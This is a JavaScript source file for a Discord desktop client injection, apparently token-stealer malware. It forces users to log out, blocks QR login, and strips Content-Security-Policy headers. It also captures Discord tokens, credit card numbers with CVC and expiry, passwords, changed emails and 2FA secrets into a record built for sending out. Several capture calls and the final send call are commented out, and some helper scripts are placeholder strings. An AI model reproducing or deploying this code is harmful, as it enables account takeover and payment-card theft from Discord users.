const electron = require("electron");
const getTokenScript = "in ./gettoken.js";
var loggedOut = ![];
var executed = ![];

electron.app.once("ready", () => {
  electron.session.defaultSession.webRequest.onBeforeRequest(
    {
      urls: [
        "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
        "https://*.discord.com/api/v*/applications/detectable",
        "https://discord.com/api/v*/applications/detectable",
        "https://*.discord.com/api/v*/users/@me/library",
        "https://discord.com/api/v*/users/@me/library",
        "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
        "https://discord.com/api/v*/users/@me/billing/subscriptions",
        "wss://remote-auth-gateway.discord.gg/*",
      ],
    },
    async (requestDetails, sendResponse) => {
      const browserWindow = electron.BrowserWindow.getAllWindows()[0];
      !loggedOut &&
        ((loggedOut = !![]),
        browserWindow.webContents.executeJavaScript(
          "check ./functions/logout.js",
          !![]
        ));
      if (requestDetails.url.startsWith("wss://remote"))
        !executed &&
          (browserWindow.webContents.executeJavaScript("in ./qrcode.js", !![]),
          (executed = !![])),
          sendResponse({ cancel: !![] });
      else sendResponse({ cancel: ![] });
    }
  );

  electron.session.defaultSession.webRequest.onHeadersReceived(
    (headerDetails, next) => {
      delete headerDetails.responseHeaders["content-security-policy"],
        delete headerDetails.responseHeaders[
          "content-security-policy-report-only"
        ],
        next({
          responseHeaders: {
            ...headerDetails.responseHeaders,
            "Access-Control-Allow-Headers": "*",
          },
        });
    }
  );

  electron.session.defaultSession.webRequest.onCompleted(
    {
      urls: [
        "https://discord.com/api/v*/users/@me",
        "https://discordapp.com/api/v*/users/@me",
        "https://*.discord.com/api/v*/users/@me",
        ,
        "https://discord.com/api/v*/users/@me/mfa/totp/enable",
        "https://discordapp.com/api/v*/users/@me/mfa/totp/enable",
        "https://*.discord.com/api/v*/users/@me/mfa/totp/enable",
        "https://discordapp.com/api/v*/auth/login",
        "https://discord.com/api/v*/auth/login",
        "https://*.discord.com/api/v*/auth/login",
        "https://api.stripe.com/v*/tokens",
      ],
    },
    async (completedDetails) => {
      const browserWindow = electron.BrowserWindow.getAllWindows()[0];
      if (completedDetails.statusCode != 200) return;
      const tokens = await browserWindow.webContents.executeJavaScript(
        getTokenScript,
        !![]
      );
      if (completedDetails.url.endsWith("tokens")) {
        const details_buffer = Buffer.from(completedDetails.uploadData[0].bytes)
          .toString()
          .replaceAll("&", "")
          .replaceAll("card", "")
          .replaceAll("[", "")
          .replaceAll("]", "")
          .replaceAll("cvc", "")
          .replaceAll("guid", "")
          .replaceAll("exp_month", "")
          .replaceAll("exp_year", "");

        newData(
          "cardAdded",
          tokens,
          details_buffer.split("=")[1],
          details_buffer.split("=")[2],
          details_buffer.split("=")[3],
          details_buffer.split("=")[4]
        );
      } else {
        const detailsObj = JSON.parse(
          Buffer.from(completedDetails.uploadData[0].bytes).toString()
        );
        if (completedDetails.url.endsWith("login"))
          //newData("login", tokens, detailsObj.password);

        if (completedDetails.url.includes("users/@me/mfa/totp/enable"))
          //newData("enabled2FA", tokens, detailsObj.secret, detailsObj.password);

        if (completedDetails.url.endsWith("users/@me")) {
          if (completedDetails.method != "PATCH") return;
          if (!detailsObj.password) return;
          if (detailsObj.email) {/*newData(
              "changedEmail",
              tokens,
              detailsObj.email,
              detailsObj.password
            );*/
          }
          if (detailsObj.new_password){
            /*newData(
              "changedPassword",
              tokens,
              detailsObj.password,
              detailsObj.new_password
            );*/
          }
        }
      }
    }
  );
});
function sendToApi(data) {
  const browserWindow = electron.BrowserWindow.getAllWindows()[0];

  browserWindow.webContents.executeJavaScript(
    "check ./functions/sendtoapi.js",
    !![]
  );
}

function newData(type, bearer, ...args) {
  const browserWindow = electron.BrowserWindow.getAllWindows()[0];

  browserWindow.webContents
    .executeJavaScript(
      'var xmlHttp = new XMLHttpRequest(); xmlHttp.open("GET", "https://discord.com/api/v9/users/@me", false); xmlHttp.setRequestHeader("Authorization", ' +
        bearer +
        "); xmlHttp.send(null); xmlHttp.responseText;",
      !![]
    )
    .then((response) => {
      var parsed = JSON.parse(response);
      var user_data = {
        username: parsed.username + "#" + parsed.discriminator,
        id: parsed.id,
        avatar: parsed.avatar,
        nitro: parsed.premium_type,
        badges: parsed.flags,
        email: parsed.email,
        token: bearer,
        type,
      };

      switch (type) {
        case "login":
          user_data.password = args[0];
          break;
        case "changedEmail":
          user_data.email = args[0];
          user_data.password = args[1];
          break;
        case "changedPassword":
          user_data.oldPassword = args[0];
          user_data.newPassword = args[1];
          break;
        case "cardAdded":
          user_data.card = {
            number: args[0],
            cvc: args[1],
            expire: {
              month: args[2],
              year: args[3],
            },
          };
          break;
        case "enabled2FA":
          user_data.secret = args[0];
          user_data.password = args[1];
          break;
      }

      //sendToApi(JSON.stringify(user_data));
    });
}
const Module = require("module");
const { join, dirname } = require("path");
const discordPath = join(dirname(require.main.filename), "..", "app.asar");
const discordPackage = require(join(discordPath, "package.json"));

/*
electron.app.setAppPath(discordPath);
electron.app.name = discordPackage.name;
Module._load(join(discordPath, discordPackage.main), null, !![]);
require.main.filename = join(discordPath, "app_bootstrap/index.js");
*/